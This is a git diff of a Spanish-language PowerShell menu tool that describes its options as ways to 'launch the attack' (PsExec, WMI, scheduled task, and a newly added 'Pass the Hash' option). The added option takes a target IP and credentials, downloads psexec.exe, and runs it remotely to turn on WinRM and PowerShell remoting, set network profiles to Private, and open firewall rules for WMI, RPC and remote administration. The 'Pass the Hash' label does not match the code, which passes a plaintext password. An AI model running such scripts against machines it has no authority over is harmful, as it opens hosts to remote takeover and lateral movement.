@@ -8,6 +8,7 @@ $Host.PrivateData.WarningForegroundColor = 'Magenta'
 $Host.PrivateData.DebugForegroundColor = 'Yellow'
 $Host.PrivateData.VerboseForegroundColor = 'Green'
 $Host.PrivateData.ProgressForegroundColor = 'White'
+$Host.PrivateData.ProgressBackgroundColor = 'Blue'
 Clear-Host
 
 function Show-Menu {
@@ -23,9 +24,10 @@ function Show-Menu {
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
      Write-Host "" 
      Write-Host "[1] - Lanzar el ataque a través de PsExec"
-     Write-Host "[2] - Lanzar el ataque a través de WMI"
-     Write-Host "[3] - Lanzar el ataque a través de ScheduleTask"
-     Write-Host "[4] - Cerrar el programa"
+     Write-Host "[2] - Lanzar el ataque a través de Pass the Hash"
+     Write-Host "[3] - Lanzar el ataque a través de WMI"
+     Write-Host "[4] - Lanzar el ataque a través de ScheduleTask"
+     Write-Host "[5] - Cerrar el programa"
      Write-Host "" }
 
 Set-StrictMode -Version Latest
@@ -61,6 +63,25 @@ function ConvertFrom-SecureToPlain {
 
         '2' {
         Write-Host ""
+        $hash = Read-Host -Prompt 'Quieres usar un hash local?'
+	Write-Host ""
+        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
+        Write-Host ""
+        $user = Read-Host -Prompt 'Y el usuario?'
+        Write-Host ""
+        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
+        $PlainTextPassword = ConvertFrom-SecureToPlain $password
+        Write-Host ""
+        $Host.UI.RawUI.ForegroundColor = 'Blue'
+        Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "winrm quickconfig -quiet ; Enable-PSRemoting -Force ; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -accepteula
+        del .\psexec.exe }
+        
+	'3' {
+        Write-Host ""
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
         Write-Host ""
         $user = Read-Host -Prompt 'Y el usuario?'
@@ -74,7 +95,7 @@ function ConvertFrom-SecureToPlain {
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }
 
-        '3' {
+        '4' {
         Write-Host ""
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
         Write-Host ""
@@ -90,14 +111,14 @@ function ConvertFrom-SecureToPlain {
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }}
 
-        '4' { exit }
+        '5' { exit }
 
         default {
         Write-Host ""
         Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta ; sleep -milliseconds 2500
         Clear-Host }}
         
-      } until ($input -in '1','2','3')
+      } until ($input -in '1','2','3','4')
 
 Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
